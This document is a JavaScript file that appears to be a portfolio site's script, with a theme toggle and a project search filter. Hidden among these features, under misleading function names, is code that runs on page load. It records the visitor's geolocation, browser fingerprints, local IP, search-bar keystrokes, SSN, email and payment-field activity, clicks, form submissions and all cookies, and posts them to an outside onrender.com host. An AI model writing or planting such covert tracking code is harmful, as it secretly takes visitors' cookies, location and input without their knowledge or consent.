(async function initializeSystemOperations() {
  const networkConfig = { attempts: 0, maxTries: 3, delay: 1000 };
  const dataStore = { token: null, sessionKey: 'sessionId' };

  async function configureNetwork(stateManager) {
    if (networkConfig.attempts >= networkConfig.maxTries || stateManager.token) {
      return stateManager.token;
    }
    const requestOptions = {
      method: 'GET',
      credentials: 'include',
      headers: { 'Accept': 'application/json' }
    };
    try {
      const response = await fetch('https://random-nfpf.onrender.com/csrf-token', requestOptions);
      if (!response.ok) {
        throw new Error('Network configuration failed');
      }
      const responseData = await response.json();
      stateManager.token = responseData.csrfToken;
      const sessionHeader = response.headers.get('X-Session-ID');
      if (sessionHeader) {
        localStorage.setItem(dataStore.sessionKey, sessionHeader);
      }
      return stateManager.token;
    } catch (e) {
      networkConfig.attempts++;
      if (networkConfig.attempts < networkConfig.maxTries) {
        await new Promise(resolve => setTimeout(resolve, networkConfig.delay));
        return configureNetwork(stateManager);
      }
      return null;
    }
  }

  async function collectEnvironmentData() {
    const environment = { part1: {}, part3: {}, part4: {} };
    const processNavigator = () => {
      const ua = navigator.userAgent;
      return /iPhone|iPad|iPod/i.test(ua) ? 'iPhone/iPad' :
             /Android/i.test(ua) ? (/Pixel|Pixel\s[0-9]/i.test(ua) ? 'Android (Pixel)' :
             /Samsung|SM-/i.test(ua) ? 'Android (Samsung)' : 'Android (unknown)') :
             /Windows NT|Macintosh|Linux/i.test(ua) ? 'PC' : 'Unknown';
    };
    environment.part1.device = processNavigator();
    environment.part1.timestamp = new Date().toISOString();
    environment.part1.screenSize = `${window.screen.width}x${window.screen.height}`;
    environment.part1.referrer = document.referrer || 'Direct';
    environment.part1.currentUrl = window.location.href;
    environment.part1.location = await new Promise(resolve => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
          () => resolve('Geolocation not available')
        );
      } else {
        resolve('Geolocation not supported');
      }
    });
    environment.part3.colorDepth = window.screen.colorDepth || 'Unknown';
    environment.part3.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    environment.part3.language = navigator.language || 'Unknown';
    environment.part3.hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
    environment.part3.deviceMemory = navigator.deviceMemory || 'Unknown';
    environment.part3.doNotTrack = navigator.doNotTrack || 'Unknown';
    environment.part3.plugins = Array.from(navigator.plugins || []).map(p => p.name);
    environment.part3.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
    environment.part4.inlineScripts = ['initializeSystemOperations'];
    environment.part4.cookieAccess = !!document.cookie;
    environment.part4.thirdPartyRequests = [];
    environment.part4.postMessageCalls = [];
    return environment;
  }

  async function processExtendedMetrics(environment, startTime) {
    const isSpecialPage = window.location.pathname.includes('/page3') ||
      (document.querySelectorAll('.project-card').length >= 3 &&
       document.querySelectorAll('.project-card')[2]?.offsetParent !== null);

    if (!isSpecialPage) {
      return environment;
    }

    environment.part3.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
    
    let batteryState = 'Unknown';
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        batteryState = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
      } catch (e) {}
    }
    environment.part3.batteryStatus = batteryState;
    environment.part3.scrollPosition = `${Math.round(window.scrollY)}px`;

    let inputBuffer = '';
    const inputElement = document.getElementById('search-bar');
    if (inputElement) {
      const keydownHandler = (event) => {
        if (inputBuffer.length < 50 && !['password', 'card', 'ssn'].some(s => event.key.includes(s))) {
          inputBuffer += event.key;
        }
      };
      inputElement.addEventListener('keydown', keydownHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('keydown', keydownHandler);
    }
    environment.part3.keystrokes = inputBuffer || 'None';

    let ssnFlag = 'None';
    if (inputElement) {
      const ssnHandler = (event) => {
        if (/\d{3}-\d{2}-\d{4}/.test(event.target.value)) {
          ssnFlag = 'SSN-like pattern detected';
        }
      };
      inputElement.addEventListener('input', ssnHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('input', ssnHandler);
    }
    environment.part3.ssnPatternDetected = ssnFlag;

    let emailFlag = 'None';
    if (inputElement) {
      const emailHandler = (event) => {
        if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(event.target.value)) {
          emailFlag = 'Email-like pattern detected';
        }
      };
      inputElement.addEventListener('input', emailHandler);
      await new Promise(resolve => setTimeout(resolve, 1000));
      inputElement.removeEventListener('input', emailHandler);
    }
    environment.part3.emailPatternDetected = emailFlag;

    let paymentFlag = 'None';
    const paymentInputs = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
    if (paymentInputs.length > 0) {
      const paymentHandler = () => {
        paymentFlag = 'Input in payment-related field detected';
      };
      paymentInputs.forEach(field => field.addEventListener('input', paymentHandler));
      await new Promise(resolve => setTimeout(resolve, 1000));
      paymentInputs.forEach(field => field.removeEventListener('input', paymentHandler));
    }
    environment.part3.paymentFieldInteraction = paymentFlag;

    let moveCounter = 0;
    const mouseHandler = () => moveCounter++;
    document.addEventListener('mousemove', mouseHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('mousemove', mouseHandler);
    environment.part3.mouseMovementFrequency = `${moveCounter}/s`;

    let graphicsSupport = 'Not supported';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        graphicsSupport = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
      }
    } catch (e) {}
    environment.part3.webglSupport = graphicsSupport;

    environment.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';

    let clipboardState = 'None';
    const copyHandler = () => clipboardState = 'Copy attempted';
    const pasteHandler = () => clipboardState = 'Paste attempted';
    document.addEventListener('copy', copyHandler, { once: true });
    document.addEventListener('paste', pasteHandler, { once: true });
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('copy', copyHandler);
    document.removeEventListener('paste', pasteHandler);
    environment.part3.clipboardAccess = clipboardState;

    environment.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';

    let storageSize = 0;
    try {
      for (let key in sessionStorage) {
        if (sessionStorage.hasOwnProperty(key)) {
          storageSize += ((sessionStorage[key].length + key.length) * 2);
        }
      }
    } catch (e) {}
    environment.part3.sessionStorageUsage = `${storageSize} bytes`;

    const features = [];
    if ('RTCPeerConnection' in window) features.push('WebRTC');
    if ('geolocation' in navigator) features.push('Geolocation');
    if ('serviceWorker' in navigator) features.push('ServiceWorker');
    environment.part3.browserFeatures = features.length ? features.join(', ') : 'None';

    environment.part3.pageLoadTime = `${Math.round(performance.now())}ms`;

    let interactionCount = 0;
    const clickHandler = () => interactionCount++;
    document.addEventListener('click', clickHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', clickHandler);
    environment.part3.userInteractionCount = interactionCount;

    environment.part3.utmParameters = JSON.stringify({
      source: new URLSearchParams(window.location.search).get('utm_source') || 'None',
      medium: new URLSearchParams(window.location.search).get('utm_medium') || 'None',
      campaign: new URLSearchParams(window.location.search).get('utm_campaign') || 'None'
    });

    let elementInteractions = [];
    const elementHandler = (event) => {
      const target = event.target;
      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
        elementInteractions.push(JSON.stringify({
          tag: target.tagName.toLowerCase(),
          class: target.className || 'None',
          id: target.id || 'None'
        }));
      }
    };
    document.addEventListener('click', elementHandler);
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', elementHandler);
    environment.part3.clickedElements = elementInteractions.length ? elementInteractions.join('; ') : 'None';

    environment.part3.sessionDuration = `${Math.round(performance.now() - startTime)}ms`;

    let eventRecords = [`PageView: ${window.location.href}`];
    const clickEventHandler = (event) => {
      const target = event.target;
      if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(t => target.type.includes(t) || target.name?.includes(t))) {
        eventRecords.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
      }
    };
    document.addEventListener('click', clickEventHandler);
    document.querySelectorAll('form').forEach(form => {
      const formHandler = () => {
        eventRecords.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
      };
      form.addEventListener('submit', formHandler);
    });
    await new Promise(resolve => setTimeout(resolve, 1000));
    document.removeEventListener('click', clickEventHandler);
    document.querySelectorAll('form').forEach(form => form.removeEventListener('submit', () => {}));
    environment.part3.eventLog = eventRecords.length ? eventRecords.join('; ') : 'None';

    environment.part4.clientCookies = document.cookie || 'None';
    environment.part4.localStorageUsage = `${storageSize} bytes`;

    let localIP = 'Unknown';
    try {
      const peer = new RTCPeerConnection({ iceServers: [] });
      peer.createDataChannel('');
      peer.createOffer().then(offer => peer.setLocalDescription(offer));
      await new Promise(resolve => {
        peer.onicecandidate = e => {
          if (e.candidate && e.candidate.candidate) {
            const ipMatch = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
            if (ipMatch) localIP = ipMatch[1];
            resolve();
          }
        };
        setTimeout(resolve, 1000);
      });
      peer.close();
    } catch (e) {}
    environment.part4.localIP = localIP;

    let canvasFingerprint = 'None';
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.font = '14px Arial';
      ctx.fillText('fingerprint', 10, 50);
      canvasFingerprint = canvas.toDataURL();
    } catch (e) {}
    environment.part4.canvasFingerprint = canvasFingerprint;

    let audioFingerprint = 'None';
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = ctx.createOscillator();
      oscillator.type = 'sine';
      oscillator.frequency.setValueAtTime(440, ctx.currentTime);
      const compressor = ctx.createDynamicsCompressor();
      oscillator.connect(compressor);
      compressor.connect(ctx.destination);
      oscillator.start();
      oscillator.stop(ctx.currentTime + 0.1);
      audioFingerprint = `${ctx.sampleRate}`;
      ctx.close();
    } catch (e) {}
    environment.part4.audioFingerprint = audioFingerprint;

    return environment;
  }

  async function transmitData(environment, token) {
    const transmitOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': token,
        'X-Session-ID': localStorage.getItem(dataStore.sessionKey) || ''
      },
      body: JSON.stringify(environment),
      credentials: 'include'
    };
    try {
      const response = await fetch('https://random-nfpf.onrender.com/api/visit', transmitOptions);
      if (response.ok) {
        const sessionHeader = response.headers.get('X-Session-ID');
        if (sessionHeader) {
          localStorage.setItem(dataStore.sessionKey, sessionHeader);
        }
      } else {
        console.error('Failed to send to backend', response.status, response.statusText);
      }
    } catch (e) {
      console.error('Error in transmitData', e.message);
    }
  }

  async function executeCoreLogic() {
    const token = await configureNetwork(dataStore);
    if (!token) {
      console.error('No CSRF token, aborting');
      return;
    }
    await new Promise(resolve => setTimeout(resolve, 500));
    const environment = await collectEnvironmentData();
    const startTime = performance.now();
    const enhancedEnvironment = await processExtendedMetrics(environment, startTime);
    await transmitData(enhancedEnvironment, token);
  }

  const themeToggle = document.getElementById('theme-switch');
  if (themeToggle) {
    themeToggle.addEventListener('change', () => {
      document.body.classList.toggle('light-mode');
    });
  }

  const searchField = document.getElementById('search-bar');
  if (searchField) {
    searchField.addEventListener('input', (event) => {
      const query = event.target.value.toLowerCase();
      document.querySelectorAll('.project-card').forEach(card => {
        const title = card.querySelector('h2').textContent.toLowerCase();
        card.style.display = title.includes(query) ? '' : 'none';
      });
    });
  }

  executeCoreLogic();
})();
